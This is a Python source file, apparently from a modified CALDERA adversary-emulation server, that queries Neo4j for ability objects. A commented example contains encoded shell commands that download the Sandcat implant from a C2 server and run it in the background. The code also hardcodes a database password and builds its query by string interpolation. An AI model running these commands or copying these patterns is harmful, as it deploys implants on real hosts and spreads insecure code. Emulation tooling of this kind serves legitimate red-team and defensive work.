import logging
import os
import uuid
import yaml
import json

from marshmallow.schema import SchemaMeta
from typing import Any, List
from base64 import b64encode, b64decode

from app.utility.base_world import BaseWorld

from neo4j import GraphDatabase

DEFAULT_LOGGER_NAME = 'rest_api_manager'


class BaseApiManager(BaseWorld):
    def __init__(self, data_svc, file_svc, logger=None):
        self._data_svc = data_svc
        self._file_svc = file_svc
        self._log = logger or self._create_default_logger()

        # Connect to Neo4j Database
        neo4j_uri = "bolt://localhost:7687"
        neo4j_user = "neo4j"
        neo4j_password = "calderaadmin"
        self.driver = GraphDatabase.driver(neo4j_uri, auth=(neo4j_user, neo4j_password))

    @property
    def log(self):
        return self._log

    def find_objects(self, ram_key: str, search: dict = None):
        """Find objects matching the given criteria"""
        for obj in self._data_svc.ram[ram_key]:
            if not search or obj.match(search):
                yield obj

    def find_object(self, ram_key: str, search: dict = None):
        for obj in self.find_objects(ram_key, search):
            return obj

    # def find_and_dump_objects(self, ram_key: str, search: dict = None, sort: str = None, include: List[str] = None,
    #                           exclude: List[str] = None):
    #     matched_objs = []
    #     for obj in self.find_objects(ram_key, search):
    #         dumped_obj = self.dump_object_with_filters(obj, include, exclude)
    #         matched_objs.append(dumped_obj)
    #     sorted_objs = sorted(matched_objs, key=lambda p: p.get(sort, 0))
    #     if sorted_objs and sort in sorted_objs[0]:
    #         return sorted(sorted_objs,
    #                       key=lambda x: 0 if x[sort] == self._data_svc.get_config(f"objects.{ram_key}.default") else 1)
    #     return sorted_objs

    def find_and_dump_objects(self, ram_key: str, search: dict = None, sort: str = None, include: List[str] = None,
                          exclude: List[str] = None):
        try:
            with self.driver.session() as session:
                # Example query: abilities
                # MATCH (abilities:Abilities)<-[:BELONGS_TO]-(ability:Ability)
                # RETURN ability.name

                #  build query
                query = f"MATCH ({ram_key}:{ram_key.capitalize()})<-[:BELONGS_TO]-(node)"

                # Account for things like '(<Access.RED: 1>, <Access.APP: 0>)'
                # Example: "MATCH (abilities:Abilities)<-[:BELONGS_TO]-(node) WHERE a.access = '(<Access.RED: 1>, <Access.APP: 0>)' RETURN node.name"

                # if search:
                    # conditions = [f"ram_key.{key} = '{value}'" for key, value in search.items()]
                    # query += " WHERE " + " AND ".join(conditions)
                query += " RETURN node"

                print(" find_and_dump_objects: query: %s"%query)

                # execute query
                result = session.run(query)
                # Retrieve the values from the result
                # values = [record["node.name"] for record in result]
                # print("values: %s"%values)
                formatted_nodes = []
                for record in result:
                    node = record["node"]
                    print(node)
                    formatted_node = {
                        "requirements": node.get("requirements", []),
                        "delete_payload": node.get("delete_payload", False),
                        "technique_id": node.get("technique_id", ""),
                        "additional_info": node.get("additional_info", {}),
                        "buckets": node.get("buckets", []),
                        "executors": node.get("executors", []),
                        "plugin": node.get("plugin", ""),
                        "description": node.get("description", ""),
                        "privilege": node.get("privilege", ""),
                        "tactic": node.get("tactic", ""),
                        "ability_id": node.get("ability_id", ""),
                        "singleton": node.get("singleton", False),
                        "technique_name": node.get("technique_name", ""),
                        "name": node.get("name", ""),
                        "repeatable": node.get("repeatable", False),
                        "access": node.get("access", {})
                    }
                    json_data = json.dumps(formatted_node)
                    formatted_nodes.append(json_data)
            

                # Needs to be updated to work with neo4j
                # matched_objs = [record['n'] for record in result]
                # dumped_objs = [self.dump_object_with_filters(obj, include, exclude) for obj in matched_objs]
                # sorted_objs = sorted(dumped_objs, key=lambda p: p.get(sort, 0))
                # default_value = self._data_svc.get_config(f"objects.{ram_key}.default")
                # sorted_objs.sort(key=lambda x: 0 if x.get(sort) == default_value else 1)
                # return sorted_objs
                
                # Example obj in dumped_objs: 
                # {
                #     "requirements": [],
                #     "delete_payload": true,
                #     "technique_id": "T1105",
                #     "additional_info": {},
                #     "buckets": [
                #       "command-and-control"
                #     ],
                #     "executors": [
                #       {
                #         "additional_info": {},
                #         "language": null,
                #         "parsers": [],
                #         "build_target": null,
                #         "variations": [
                #           {
                #             "description": "Deploy as a blue-team agent instead of red",
                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUgJg=="
                #           },
                #           {
                #             "description": "Download with a random name and start as a background process",
                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgJg=="
                #           },
                #           {
                #             "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6I3thZ2VudC5leHRlbnNpb25zfSIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLXY="
                #           },
                #           {
                #             "description": "Download with GIST C2",
                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6Z2lzdCIgLUggImMyOmdpc3QiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLWMyIEdJU1QgLXY="
                #           },
                #           {
                #             "description": "Deploy as a P2P agent with known peers included in compiled agent",
                #             "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6cHJveHlfaHR0cCIgLUggImluY2x1ZGVQcm94eVBlZXJzOkhUVFAiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLXNlcnZlciAkc2VydmVyIC1saXN0ZW5QMlAgLXY="
                #           }
                #         ],
                #         "code": null,
                #         "cleanup": [],
                #         "payloads": [],
                #         "timeout": 60,
                #         "platform": "darwin",
                #         "name": "sh",
                #         "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v",
                #         "uploads": []
                #       }
                #     ],
                #     "plugin": "sandcat",
                #     "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
                #     "privilege": "",
                #     "tactic": "command-and-control",
                #     "ability_id": "2f34977d-9558-4c12-abad-349716777c6b",
                #     "singleton": false,
                #     "technique_name": "Ingress Tool Transfer",
                #     "name": "Sandcat",
                #     "repeatable": false,
                #     "access": {}
                #   }
                print("formatted_nodes: %s"%formatted_nodes)
                return formatted_nodes
        except Exception as e:
            self.log.error('[!] Error finding and dumping objects: %s' % e)
            return []
        finally:
            if session is not None:
                session.close()

    @staticmethod
    def dump_object_with_filters(obj: Any, include: List[str] = None, exclude: List[str] = None) -> dict:
        dumped = obj.display
        if include:
            exclude_attributes = list(set(dumped.keys()) - set(include))
            exclude = set(exclude + exclude_attributes) if exclude else exclude_attributes
        if exclude:
            for exclude_attribute in exclude:
                dumped.pop(exclude_attribute, None)
        return dumped

    def create_object_from_schema(self, schema: SchemaMeta, data: dict, access: BaseWorld.Access):
        obj_schema = schema()
        obj = obj_schema.load(data)
        obj.access = self._get_allowed_from_access(access)
        return obj.store(self._data_svc.ram)

    async def create_on_disk_object(self, data: dict, access: dict, ram_key: str, id_property: str, obj_class: type):
        obj_id = data.get(id_property) or str(uuid.uuid4())
        data[id_property] = obj_id

        file_path = await self._get_new_object_file_path(data[id_property], ram_key)
        allowed = self._get_allowed_from_access(access)
        await self._save_and_reload_object(file_path, data, obj_class, allowed)
        return next(self.find_objects(ram_key, {id_property: obj_id}))

    def _get_allowed_from_access(self, access) -> BaseWorld.Access:
        if self._data_svc.Access.HIDDEN in access['access']:
            return self._data_svc.Access.HIDDEN
        elif self._data_svc.Access.BLUE in access['access']:
            return self._data_svc.Access.BLUE
        else:
            return self._data_svc.Access.RED

    def find_and_update_object(self, ram_key: str, data: dict, search: dict = None):
        for obj in self.find_objects(ram_key, search):
            new_obj = self.update_object(obj, data)
            return new_obj

    def update_object(self, obj: Any, data: dict):
        dumped_obj = obj.schema.dump(obj)
        for key, value in dumped_obj.items():
            if key not in data:
                data[key] = value
        return self.replace_object(obj, data)

    def replace_object(self, obj: Any, data: dict):
        new_obj = obj.schema.load(data)
        return new_obj.store(self._data_svc.ram)

    async def find_and_update_on_disk_object(self, data: dict, search: dict, ram_key: str, id_property: str, obj_class: type):
        for obj in self.find_objects(ram_key, search):
            new_obj = await self.update_on_disk_object(obj, data, ram_key, id_property, obj_class)
            return new_obj

    async def update_on_disk_object(self, obj: Any, data: dict, ram_key: str, id_property: str, obj_class: type):
        obj_id = getattr(obj, id_property)
        file_path = await self._get_existing_object_file_path(obj_id, ram_key)

        existing_obj_data = dict(self.strip_yml(file_path)[0])
        existing_obj_data.update(data)

        await self._save_and_reload_object(file_path, existing_obj_data, obj_class, obj.access)
        return next(self.find_objects(ram_key, {id_property: obj_id}))

    async def replace_on_disk_object(self, obj: Any, data: dict, ram_key: str, id_property: str):
        obj_id = getattr(obj, id_property)
        file_path = await self._get_existing_object_file_path(obj_id, ram_key)

        await self._save_and_reload_object(file_path, data, type(obj), obj.access)
        return next(self.find_objects(ram_key, {id_property: obj_id}))

    async def remove_object_from_memory_by_id(self, identifier: str, ram_key: str, id_property: str):
        await self._data_svc.remove(ram_key, {id_property: identifier})

    async def remove_object_from_disk_by_id(self, identifier: str, ram_key: str):
        file_path = await self._get_existing_object_file_path(identifier, ram_key)

        if os.path.exists(file_path):
            os.remove(file_path)

    @staticmethod
    async def _get_new_object_file_path(identifier: str, ram_key: str) -> str:
        """Create file path for new object"""
        return os.path.join('data', ram_key, f'{identifier}.yml')

    async def _get_existing_object_file_path(self, identifier: str, ram_key: str) -> str:
        """Find file path for existing object (by id)"""
        _, file_path = await self._file_svc.find_file_path(f'{identifier}.yml', location=ram_key)
        if not file_path:
            file_path = await self._get_new_object_file_path(identifier, ram_key)
        return file_path

    async def _save_and_reload_object(self, file_path: str, data: dict, obj_type: type, access: BaseWorld.Access):
        """Save data as YAML and reload from disk into memory"""
        await self._file_svc.save_file(file_path, yaml.dump(data, encoding='utf-8', sort_keys=False), '', encrypt=False)
        await self._data_svc.load_yaml_file(obj_type, file_path, access)

    @staticmethod
    def _create_default_logger():
        return logging.getLogger(DEFAULT_LOGGER_NAME)

    @staticmethod
    def _encode_string(s):
        return str(b64encode(s.encode()), 'utf-8')

    @staticmethod
    def _decode_string(s):
        return str(b64decode(s), 'utf-8')
